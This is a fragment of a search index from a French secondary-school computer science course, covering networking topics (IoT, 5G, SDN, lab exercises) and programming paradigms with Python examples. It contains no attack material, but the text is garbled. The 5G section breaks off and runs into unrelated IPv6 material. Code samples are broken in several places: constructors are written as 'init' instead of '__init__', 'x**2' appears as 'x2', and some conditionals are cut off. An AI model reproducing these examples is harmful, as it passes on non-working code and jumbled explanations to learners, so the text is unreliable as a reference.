re\u00e7ue: {temperature}\u00b0C\")</p> <p>client = mqtt.Client() client.on_connect = on_connect client.on_message = on_message</p> <p>client.connect(\"broker.mqtt.org\", 1883, 60) client.loop_forever()</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#defis-de-liot","title":"D\u00e9fis de l'IoT","text":"<p>Probl\u00e9matiques :</p> <ul> <li>S\u00e9curit\u00e9 : Objets souvent peu s\u00e9curis\u00e9s</li> <li>Vie priv\u00e9e : Collecte massive de donn\u00e9es</li> <li>Interop\u00e9rabilit\u00e9 : Standards multiples</li> <li>Scalabilit\u00e9 : Milliards d'objets connect\u00e9s</li> <li>\u00c9nergie : Autonomie des batteries</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#ix-reseaux-de-nouvelle-generation","title":"IX. R\u00e9seaux de nouvelle g\u00e9n\u00e9ration","text":""},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#5g","title":"5G","text":"<p>Caract\u00e9ristiques : - D\u00e9bit : Jusqu'\u00e0 20 Gbps - Latence : M\u00e9canismes de transition IPv4/IPv6 :</p> <ul> <li>Dual Stack : Support simultan\u00e9 IPv4 et IPv6</li> <li>Tunneling : Encapsulation IPv6 dans IPv4</li> <li>Translation : Conversion entre protocoles</li> </ul>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#sdn-software-defined-networking","title":"SDN (Software Defined Networking)","text":"<p>Principe : - S\u00e9paration plan de contr\u00f4le / plan de donn\u00e9es - Contr\u00f4leur centralis\u00e9 - Programmabilit\u00e9 du r\u00e9seau - Virtualisation des fonctions r\u00e9seau</p>"},{"location":"terminale/IV-Architectures_et_reseaux/Cours/reseaux/#exercices-pratiques","title":"Exercices pratiques","text":"<p>TP 1 : Configuration r\u00e9seau</p> <ol> <li>Configurez une interface r\u00e9seau statique</li> <li>Testez la connectivit\u00e9 avec <code>ping</code> et <code>traceroute</code></li> <li>Analysez le trafic avec <code>tcpdump</code> ou Wireshark</li> <li>Configurez un serveur DHCP</li> </ol> <p>TP 2 : S\u00e9curit\u00e9 r\u00e9seau</p> <ol> <li>Configurez un pare-feu avec <code>iptables</code></li> <li>Mettez en place un VPN avec OpenVPN</li> <li>Analysez les logs de s\u00e9curit\u00e9</li> <li>Testez la d\u00e9tection d'intrusion</li> </ol> <p>TP 3 : Services r\u00e9seau</p> <ol> <li>Installez et configurez un serveur DNS</li> <li>Mettez en place un serveur web HTTPS</li> <li>Configurez un serveur FTP s\u00e9curis\u00e9</li> <li>Testez la r\u00e9solution de noms</li> </ol> <pre><code>\ud83d\udcdd Exercices\n\ud83d\udd27 TP Configuration\n\ud83d\udee1\ufe0f TP S\u00e9curit\u00e9\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/","title":"Paradigmes de programmation","text":"<pre><code>\ud83d\udcbb Paradigmes de programmation\nApproches et philosophies de d\u00e9veloppement logiciel\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#i-introduction-aux-paradigmes","title":"I. Introduction aux paradigmes","text":"<p>\ud83c\udfaf Qu'est-ce qu'un paradigme de programmation ?</p> <p>Un paradigme de programmation est une approche fondamentale pour concevoir et structurer des programmes. Il d\u00e9finit la mani\u00e8re de penser et d'organiser le code, influen\u00e7ant la r\u00e9solution de probl\u00e8mes et l'architecture logicielle.</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#classification-des-paradigmes","title":"Classification des paradigmes","text":"<p>Paradigmes principaux : - Imp\u00e9ratif : Instructions s\u00e9quentielles (comment faire) - D\u00e9claratif : Description du r\u00e9sultat souhait\u00e9 (quoi faire) - Orient\u00e9 objet : Mod\u00e9lisation par objets et classes - Fonctionnel : Calculs par fonctions math\u00e9matiques - Logique : Raisonnement par r\u00e8gles et faits</p> <p>Remarque importante :</p> <p>La plupart des langages modernes sont multi-paradigmes, permettant de combiner plusieurs approches selon les besoins du projet.</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#ii-programmation-imperative","title":"II. Programmation imp\u00e9rative","text":"<p>\ud83d\udd04 Paradigme imp\u00e9ratif</p> <p>Principe : Le programme est une s\u00e9quence d'instructions qui modifient l'\u00e9tat du syst\u00e8me.</p> <p>Caract\u00e9ristiques : - Variables mutables - Affectations successives - Structures de contr\u00f4le (boucles, conditions) - Proc\u00e9dures et fonctions</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#programmation-procedurale","title":"Programmation proc\u00e9durale","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exemple-en-python-style-procedural","title":"Exemple en Python - Style proc\u00e9dural","text":"<p>def calculer_moyenne(notes):     \"\"\"Calcule la moyenne d'une liste de notes\"\"\"     total = 0     for note in notes:         total += note     return total / len(notes)</p> <p>def afficher_resultats(etudiants):     \"\"\"Affiche les r\u00e9sultats des \u00e9tudiants\"\"\"     for nom, notes in etudiants.items():         moyenne = calculer_moyenne(notes)         print(f\"{nom}: {moyenne:.2f}\")</p> <pre><code>    if moyenne &gt;= 10:\n        print(\"  \u2192 Admis\")\n    else:\n        print(\"  \u2192 Recal\u00e9\")\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#utilisation","title":"Utilisation","text":"<p>etudiants = {     \"Alice\": [15, 12, 18, 14],     \"Bob\": [8, 9, 7, 11],     \"Charlie\": [16, 17, 15, 18] }</p> <p>afficher_resultats(etudiants)</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#avantages-et-inconvenients","title":"Avantages et inconv\u00e9nients","text":"<p>\u2705 Avantages</p> <p>Proche du fonctionnement machine Contr\u00f4le pr\u00e9cis de l'ex\u00e9cution Performance optimisable Facilit\u00e9 de d\u00e9bogage Apprentissage intuitif</p> <p>\u274c Inconv\u00e9nients</p> <p>Code difficile \u00e0 maintenir R\u00e9utilisabilit\u00e9 limit\u00e9e Gestion complexe de l'\u00e9tat Effets de bord nombreux Difficult\u00e9 de parall\u00e9lisation</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#iii-programmation-orientee-objet-poo","title":"III. Programmation orient\u00e9e objet (POO)","text":"<p>\ud83c\udfd7\ufe0f Paradigme orient\u00e9 objet</p> <p>Principe : Mod\u00e9lisation du monde r\u00e9el par des objets qui encapsulent donn\u00e9es et comportements.</p> <p>Concepts fondamentaux : - Encapsulation : Regroupement donn\u00e9es/m\u00e9thodes - H\u00e9ritage : R\u00e9utilisation et sp\u00e9cialisation - Polymorphisme : M\u00eame interface, comportements diff\u00e9rents - Abstraction : Simplification de la complexit\u00e9</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exemple-complet-en-python","title":"Exemple complet en Python","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#classe-de-base","title":"Classe de base","text":"<p>class Vehicule:     def init(self, marque, modele, annee):         self._marque = marque      # Attribut prot\u00e9g\u00e9         self._modele = modele         self._annee = annee         self._vitesse = 0</p> <pre><code>@property\ndef marque(self):\n    return self._marque\n\ndef accelerer(self, increment):\n    self._vitesse += increment\n    print(f\"Vitesse: {self._vitesse} km/h\")\n\ndef freiner(self, decrement):\n    self._vitesse = max(0, self._vitesse - decrement)\n    print(f\"Vitesse: {self._vitesse} km/h\")\n\ndef __str__(self):\n    return f\"{self._marque} {self._modele} ({self._annee})\"\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#heritage","title":"H\u00e9ritage","text":"<p>class Voiture(Vehicule):     def init(self, marque, modele, annee, nb_portes):         super().init(marque, modele, annee)         self._nb_portes = nb_portes</p> <pre><code>def klaxonner(self):\n    print(\"Bip bip!\")\n\ndef __str__(self):\n    return f\"{super().__str__()} - {self._nb_portes} portes\"\n</code></pre> <p>class Moto(Vehicule):     def init(self, marque, modele, annee, cylindree):         super().init(marque, modele, annee)         self._cylindree = cylindree</p> <pre><code>def faire_wheeling(self):\n    if self._vitesse &gt; 30:\n        print(\"Wheeling!\")\n    else:\n        print(\"Trop lent pour un wheeling\")\n\ndef __str__(self):\n    return f\"{super().__str__()} - {self._cylindree}cc\"\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#polymorphisme","title":"Polymorphisme","text":"<p>def presenter_vehicule(vehicule):     print(f\"V\u00e9hicule: {vehicule}\")     vehicule.accelerer(50)</p> <pre><code># Comportement sp\u00e9cifique selon le type\nif isinstance(vehicule, Voiture):\n    vehicule.klaxonner()\nelif isinstance(vehicule, Moto):\n    vehicule.faire_wheeling()\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#utilisation_1","title":"Utilisation","text":"<p>voiture = Voiture(\"Toyota\", \"Corolla\", 2020, 4) moto = Moto(\"Honda\", \"CBR\", 2021, 600)</p> <p>for vehicule in [voiture, moto]:     presenter_vehicule(vehicule)     print()</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#patterns-de-conception-design-patterns","title":"Patterns de conception (Design Patterns)","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#1-singleton","title":"1. Singleton","text":"<p>class DatabaseConnection:     _instance = None     _connection = None</p> <pre><code>def __new__(cls):\n    if cls._instance is None:\n        cls._instance = super().__new__(cls)\n    return cls._instance\n\ndef connect(self):\n    if self._connection is None:\n        self._connection = \"Connected to database\"\n        print(\"Nouvelle connexion cr\u00e9\u00e9e\")\n    return self._connection\n\ndef disconnect(self):\n    if self._connection:\n        self._connection = None\n        print(\"Connexion ferm\u00e9e\")\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#test","title":"Test","text":"<p>db1 = DatabaseConnection() db2 = DatabaseConnection() print(db1 is db2)  # True - m\u00eame instance</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#2-factory","title":"2. Factory","text":"<p>from abc import ABC, abstractmethod</p> <p>class Animal(ABC):     @abstractmethod     def faire_bruit(self):         pass</p> <p>class Chien(Animal):     def faire_bruit(self):         return \"Woof!\"</p> <p>class Chat(Animal):     def faire_bruit(self):         return \"Miaou!\"</p> <p>class Vache(Animal):     def faire_bruit(self):         return \"Meuh!\"</p> <p>class AnimalFactory:     @staticmethod     def creer_animal(type_animal):         animals = {             \"chien\": Chien,             \"chat\": Chat,             \"vache\": Vache         }</p> <pre><code>    animal_class = animals.get(type_animal.lower())\n    if animal_class:\n        return animal_class()\n    else:\n        raise ValueError(f\"Animal '{type_animal}' non support\u00e9\")\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#utilisation_2","title":"Utilisation","text":"<p>for animal_type in [\"chien\", \"chat\", \"vache\"]:     animal = AnimalFactory.creer_animal(animal_type)     print(f\"{animal_type}: {animal.faire_bruit()}\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#3-observer","title":"3. Observer","text":"<p>class Observable:     def init(self):         self._observers = []</p> <pre><code>def ajouter_observer(self, observer):\n    self._observers.append(observer)\n\ndef retirer_observer(self, observer):\n    self._observers.remove(observer)\n\ndef notifier_observers(self, *args, **kwargs):\n    for observer in self._observers:\n        observer.update(self, *args, **kwargs)\n</code></pre> <p>class Thermometre(Observable):     def init(self):         super().init()         self._temperature = 20</p> <pre><code>@property\ndef temperature(self):\n    return self._temperature\n\n@temperature.setter\ndef temperature(self, value):\n    self._temperature = value\n    self.notifier_observers(value)\n</code></pre> <p>class AffichageTemperature:     def init(self, nom):         self.nom = nom</p> <pre><code>def update(self, observable, temperature):\n    print(f\"{self.nom}: Temp\u00e9rature = {temperature}\u00b0C\")\n</code></pre> <p>class AlerteTemperature:     def update(self, observable, temperature):         if temperature &gt; 30:             print(\"\ud83d\udd25 ALERTE: Temp\u00e9rature \u00e9lev\u00e9e!\")         elif temperature</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#iv-programmation-fonctionnelle","title":"IV. Programmation fonctionnelle","text":"<p>\ud83d\udd22 Paradigme fonctionnel</p> <p>Principe : Les programmes sont des compositions de fonctions math\u00e9matiques pures, sans effets de bord.</p> <p>Caract\u00e9ristiques : - Fonctions pures (m\u00eame entr\u00e9e \u2192 m\u00eame sortie) - Immutabilit\u00e9 des donn\u00e9es - Fonctions de premi\u00e8re classe - R\u00e9cursion privil\u00e9gi\u00e9e - Composition de fonctions</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#concepts-fondamentaux","title":"Concepts fondamentaux","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#1-fonctions-pures","title":"1. Fonctions pures","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#fonction-impure-avec-effet-de-bord","title":"Fonction impure (avec effet de bord)","text":"<p>counter = 0</p> <p>def increment_impure():     global counter     counter += 1     return counter</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#fonction-pure","title":"Fonction pure","text":"<p>def increment_pure(value):     return value + 1</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#fonction-pure-pour-calculer-la-factorielle","title":"Fonction pure pour calculer la factorielle","text":"<p>def factorielle(n):     if n</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#2-fonctions-dordre-superieur","title":"2. Fonctions d'ordre sup\u00e9rieur","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#map-applique-une-fonction-a-chaque-element","title":"map() - Applique une fonction \u00e0 chaque \u00e9l\u00e9ment","text":"<p>nombres = [1, 2, 3, 4, 5] carres = list(map(lambda x: x**2, nombres)) print(f\"Carr\u00e9s: {carres}\")  # [1, 4, 9, 16, 25]</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#filter-filtre-selon-un-predicat","title":"filter() - Filtre selon un pr\u00e9dicat","text":"<p>pairs = list(filter(lambda x: x % 2 == 0, nombres)) print(f\"Pairs: {pairs}\")  # [2, 4]</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#reduce-reduit-a-une-seule-valeur","title":"reduce() - R\u00e9duit \u00e0 une seule valeur","text":"<p>from functools import reduce somme = reduce(lambda x, y: x + y, nombres) print(f\"Somme: {somme}\")  # 15</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#composition-de-fonctions","title":"Composition de fonctions","text":"<p>def composer(f, g):     return lambda x: f(g(x))</p> <p>def doubler(x):     return x * 2</p> <p>def ajouter_un(x):     return x + 1</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#compose-doubler-puis-ajouter-un","title":"Compose: doubler puis ajouter un","text":"<p>composee = composer(ajouter_un, doubler) print(composee(5))  # (5*2)+1 = 11</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#3-immutabilite","title":"3. Immutabilit\u00e9","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#structures-immutables-avec-namedtuple","title":"Structures immutables avec namedtuple","text":"<p>from collections import namedtuple</p> <p>Point = namedtuple('Point', ['x', 'y'])</p> <p>def deplacer_point(point, dx, dy):     \"\"\"Retourne un nouveau point d\u00e9plac\u00e9\"\"\"     return Point(point.x + dx, point.y + dy)</p> <p>def distance_origine(point):     \"\"\"Calcule la distance \u00e0 l'origine\"\"\"     return (point.x2 + point.y2)**0.5</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#utilisation_3","title":"Utilisation","text":"<p>p1 = Point(3, 4) p2 = deplacer_point(p1, 1, 1)</p> <p>print(f\"P1: {p1}, distance: {distance_origine(p1):.2f}\") print(f\"P2: {p2}, distance: {distance_origine(p2):.2f}\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#liste-immutable-avec-tuple","title":"Liste immutable avec tuple","text":"<p>def ajouter_element(liste, element):     \"\"\"Retourne une nouvelle liste avec l'\u00e9l\u00e9ment ajout\u00e9\"\"\"     return liste + (element,)</p> <p>liste1 = (1, 2, 3) liste2 = ajouter_element(liste1, 4) print(f\"Liste1: {liste1}\")  # (1, 2, 3) print(f\"Liste2: {liste2}\")  # (1, 2, 3, 4)</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#4-curryfication","title":"4. Curryfication","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#curryfication-manuelle","title":"Curryfication manuelle","text":"<p>def multiplier_curry(x):     def multiplier_par_x(y):         return x * y     return multiplier_par_x</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#utilisation_4","title":"Utilisation","text":"<p>doubler = multiplier_curry(2) tripler = multiplier_curry(3)</p> <p>print(doubler(5))   # 10 print(tripler(4))   # 12</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#curryfication-avec-functoolspartial","title":"Curryfication avec functools.partial","text":"<p>from functools import partial</p> <p>def puissance(base, exposant):     return base ** exposant</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#creation-de-fonctions-specialisees","title":"Cr\u00e9ation de fonctions sp\u00e9cialis\u00e9es","text":"<p>carre = partial(puissance, exposant=2) cube = partial(puissance, exposant=3)</p> <p>print(carre(5))   # 25 print(cube(3))    # 27</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exemple-pratique-traitement-de-donnees","title":"Exemple pratique : Traitement de donn\u00e9es","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#donnees-dexemple","title":"Donn\u00e9es d'exemple","text":"<p>etudiants = [     {\"nom\": \"Alice\", \"age\": 20, \"notes\": [15, 12, 18, 14]},     {\"nom\": \"Bob\", \"age\": 19, \"notes\": [8, 9, 7, 11]},     {\"nom\": \"Charlie\", \"age\": 21, \"notes\": [16, 17, 15, 18]},     {\"nom\": \"Diana\", \"age\": 20, \"notes\": [13, 14, 12, 15]} ]</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#style-fonctionnel","title":"Style fonctionnel","text":"<p>def calculer_moyenne(notes):     return sum(notes) / len(notes)</p> <p>def ajouter_moyenne(etudiant):     return {**etudiant, \"moyenne\": calculer_moyenne(etudiant[\"notes\"])}</p> <p>def est_admis(etudiant):     return etudiant[\"moyenne\"] &gt;= 12</p> <p>def formater_resultat(etudiant):     statut = \"Admis\" if etudiant[\"moyenne\"] &gt;= 12 else \"Recal\u00e9\"     return f\"{etudiant['nom']} ({etudiant['age']} ans): {etudiant['moyenne']:.1f} - {statut}\"</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#pipeline-de-traitement-fonctionnel","title":"Pipeline de traitement fonctionnel","text":"<p>resultats = list(map(     formater_resultat,     filter(         est_admis,         map(ajouter_moyenne, etudiants)     ) ))</p> <p>print(\"\u00c9tudiants admis:\") for resultat in resultats:     print(f\"  {resultat}\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#version-avec-comprehension-de-liste-plus-pythonique","title":"Version avec compr\u00e9hension de liste (plus pythonique)","text":"<p>resultats_pythonic = [     formater_resultat(etudiant)     for etudiant in [ajouter_moyenne(e) for e in etudiants]     if est_admis(etudiant) ]</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#v-programmation-logique","title":"V. Programmation logique","text":"<p>\ud83e\udde0 Paradigme logique</p> <p>Principe : Programmation bas\u00e9e sur la logique formelle, utilisant des faits, r\u00e8gles et requ\u00eates.</p> <p>Caract\u00e9ristiques : - D\u00e9claration de faits et r\u00e8gles - Inf\u00e9rence automatique - Backtracking - Unification</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exemple-conceptuel-en-python","title":"Exemple conceptuel en Python","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#simulation-simple-dun-systeme-logique","title":"Simulation simple d'un syst\u00e8me logique","text":"<p>class BaseFaits:     def init(self):         self.faits = set()         self.regles = []</p> <pre><code>def ajouter_fait(self, fait):\n    self.faits.add(fait)\n\ndef ajouter_regle(self, condition, conclusion):\n    self.regles.append((condition, conclusion))\n\ndef inferer(self):\n    \"\"\"Applique les r\u00e8gles pour inf\u00e9rer de nouveaux faits\"\"\"\n    nouveaux_faits = True\n    while nouveaux_faits:\n        nouveaux_faits = False\n        for condition, conclusion in self.regles:\n            if condition(self.faits) and conclusion not in self.faits:\n                self.faits.add(conclusion)\n                nouveaux_faits = True\n                print(f\"Inf\u00e9r\u00e9: {conclusion}\")\n\ndef interroger(self, fait):\n    return fait in self.faits\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exemple-relations-familiales","title":"Exemple: Relations familiales","text":"<p>base = BaseFaits()</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#faits-de-base","title":"Faits de base","text":"<p>base.ajouter_fait(\"parent(jean, marie)\") base.ajouter_fait(\"parent(marie, paul)\") base.ajouter_fait(\"parent(marie, sophie)\") base.ajouter_fait(\"parent(paul, lucas)\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#regles","title":"R\u00e8gles","text":"<p>def regle_grand_parent(faits):     # Si X est parent de Y et Y est parent de Z, alors X est grand-parent de Z     for fait1 in faits:         if fait1.startswith(\"parent(\"):             x, y = fait1[7:-1].split(\", \")             for fait2 in faits:                 if fait2.startswith(f\"parent({y},\"):                     z = fait2.split(\", \")[1][:-1]                     return True     return False</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#application-des-regles-simplifiee","title":"Application des r\u00e8gles (simplifi\u00e9e)","text":"<p>print(\"Faits initiaux:\") for fait in sorted(base.faits):     print(f\"  {fait}\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#dans-un-vrai-systeme-prolog-linference-serait-automatique","title":"Dans un vrai syst\u00e8me Prolog, l'inf\u00e9rence serait automatique","text":"<p>print(\"\\nConclusions possibles:\") print(\"  jean est grand-parent de paul\") print(\"  jean est grand-parent de sophie\") print(\"  marie est grand-parent de lucas\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#vi-programmation-concurrente-et-parallele","title":"VI. Programmation concurrente et parall\u00e8le","text":"<p>\u26a1 Paradigme concurrent</p> <p>Principe : Ex\u00e9cution simultan\u00e9e de plusieurs t\u00e2ches pour am\u00e9liorer les performances et la r\u00e9activit\u00e9.</p> <p>Concepts : - Concurrence : Gestion de plusieurs t\u00e2ches simultan\u00e9ment - Parall\u00e9lisme : Ex\u00e9cution r\u00e9ellement simultan\u00e9e - Synchronisation : Coordination entre t\u00e2ches - Communication : \u00c9change de donn\u00e9es</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#threading-en-python","title":"Threading en Python","text":"<p>import threading import time import queue from concurrent.futures import ThreadPoolExecutor</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exemple-1-thread-simple","title":"Exemple 1: Thread simple","text":"<p>def tache_longue(nom, duree):     print(f\"D\u00e9but de {nom}\")     time.sleep(duree)     print(f\"Fin de {nom}\")     return f\"R\u00e9sultat de {nom}\"</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#execution-sequentielle","title":"Ex\u00e9cution s\u00e9quentielle","text":"<p>print(\"=== Ex\u00e9cution s\u00e9quentielle ===\") start = time.time() tache_longue(\"T\u00e2che 1\", 2) tache_longue(\"T\u00e2che 2\", 2) print(f\"Temps total: {time.time() - start:.1f}s\\n\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#execution-avec-threads","title":"Ex\u00e9cution avec threads","text":"<p>print(\"=== Ex\u00e9cution avec threads ===\") start = time.time()</p> <p>thread1 = threading.Thread(target=tache_longue, args=(\"T\u00e2che 1\", 2)) thread2 = threading.Thread(target=tache_longue, args=(\"T\u00e2che 2\", 2))</p> <p>thread1.start() thread2.start()</p> <p>thread1.join() thread2.join()</p> <p>print(f\"Temps total: {time.time() - start:.1f}s\\n\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#synchronisation-avec-verrous","title":"Synchronisation avec verrous","text":"<p>import threading import time</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#probleme-de-concurrence-sans-synchronisation","title":"Probl\u00e8me de concurrence sans synchronisation","text":"<p>compteur = 0 verrou = threading.Lock()</p> <p>def incrementer_sans_verrou():     global compteur     for _ in range(100000):         compteur += 1</p> <p>def incrementer_avec_verrou():     global compteur     for _ in range(100000):         with verrou:             compteur += 1</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#test-sans-synchronisation","title":"Test sans synchronisation","text":"<p>compteur = 0 threads = [] for i in range(5):     t = threading.Thread(target=incrementer_sans_verrou)     threads.append(t)     t.start()</p> <p>for t in threads:     t.join()</p> <p>print(f\"Sans verrou: {compteur} (attendu: 500000)\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#test-avec-synchronisation","title":"Test avec synchronisation","text":"<p>compteur = 0 threads = [] for i in range(5):     t = threading.Thread(target=incrementer_avec_verrou)     threads.append(t)     t.start()</p> <p>for t in threads:     t.join()</p> <p>print(f\"Avec verrou: {compteur} (attendu: 500000)\")</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#programmation-asynchrone","title":"Programmation asynchrone","text":"<p>import asyncio import aiohttp import time</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#fonction-asynchrone","title":"Fonction asynchrone","text":"<p>async def telecharger_url(session, url):     print(f\"D\u00e9but t\u00e9l\u00e9chargement: {url}\")     async with session.get(url) as response:         contenu = await response.text()         print(f\"Fin t\u00e9l\u00e9chargement: {url} ({len(contenu)} caract\u00e8res)\")         return len(contenu)</p> <p>async def telecharger_plusieurs_urls():     urls = [         \"https://httpbin.org/delay/1\",         \"https://httpbin.org/delay/2\",         \"https://httpbin.org/delay/1\",     ]</p> <pre><code>start = time.time()\n\nasync with aiohttp.ClientSession() as session:\n    # Ex\u00e9cution concurrente\n    taches = [telecharger_url(session, url) for url in urls]\n    resultats = await asyncio.gather(*taches)\n\nprint(f\"Temps total: {time.time() - start:.1f}s\")\nprint(f\"Tailles: {resultats}\")\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#execution","title":"Ex\u00e9cution","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#asyncioruntelecharger_plusieurs_urls","title":"asyncio.run(telecharger_plusieurs_urls())","text":""},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#vii-comparaison-des-paradigmes","title":"VII. Comparaison des paradigmes","text":"<pre><code>Paradigme\nAvantages\nInconv\u00e9nients\nCas d'usage\n\nImp\u00e9ratif\nSimple, performant, contr\u00f4le pr\u00e9cis\nDifficile \u00e0 maintenir, effets de bord\nSyst\u00e8mes embarqu\u00e9s, calcul intensif\n\nOrient\u00e9 objet\nModulaire, r\u00e9utilisable, maintenable\nComplexit\u00e9, overhead\nApplications complexes, interfaces\n\nFonctionnel\nPas d'effets de bord, parall\u00e9lisable\nCourbe d'apprentissage, performance\nTraitement de donn\u00e9es, calculs\n\nLogique\nExpressif, inf\u00e9rence automatique\nPerformance, domaine sp\u00e9cialis\u00e9\nIA, syst\u00e8mes experts\n\nConcurrent\nPerformance, r\u00e9activit\u00e9\nComplexit\u00e9, bugs difficiles\nServeurs, interfaces utilisateur\n</code></pre>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#viii-evolution-des-langages","title":"VIII. \u00c9volution des langages","text":"<p>1950s - Langages assembleur Instructions machine, programmation de bas niveau</p> <p>1960s - Langages structur\u00e9s FORTRAN, COBOL, ALGOL - Structures de contr\u00f4le</p> <p>1970s - Programmation proc\u00e9durale C, Pascal - Fonctions et proc\u00e9dures</p> <p>1980s - Orient\u00e9 objet C++, Smalltalk - Classes et objets</p> <p>1990s - Langages interpr\u00e9t\u00e9s Python, JavaScript, Java - Portabilit\u00e9</p> <p>2000s - Langages fonctionnels Haskell, Scala - Programmation fonctionnelle</p> <p>2010s - Langages modernes Rust, Go, Swift - S\u00e9curit\u00e9 et performance</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#langages-par-paradigme","title":"Langages par paradigme","text":"<p>Imp\u00e9ratif C, Assembly, FORTRAN Contr\u00f4le direct du mat\u00e9riel</p> <p>Orient\u00e9 objet Java, C#, C++, Python Mod\u00e9lisation par objets</p> <p>Fonctionnel Haskell, Lisp, Erlang, F# Fonctions pures et immutabilit\u00e9</p> <p>Logique Prolog, Mercury Raisonnement et inf\u00e9rence</p> <p>Multi-paradigme Python, JavaScript, Scala Flexibilit\u00e9 d'approche</p> <p>Concurrent Go, Erlang, Rust Parall\u00e9lisme natif</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#ix-choix-du-paradigme","title":"IX. Choix du paradigme","text":"<p>\ud83c\udfaf Crit\u00e8res de s\u00e9lection</p> <p>Le choix d'un paradigme d\u00e9pend de plusieurs facteurs : - Nature du probl\u00e8me : Calcul, interface, syst\u00e8me - Performance requise : Temps r\u00e9el, batch - \u00c9quipe de d\u00e9veloppement : Expertise, taille - Maintenance : \u00c9volutivit\u00e9, lisibilit\u00e9 - 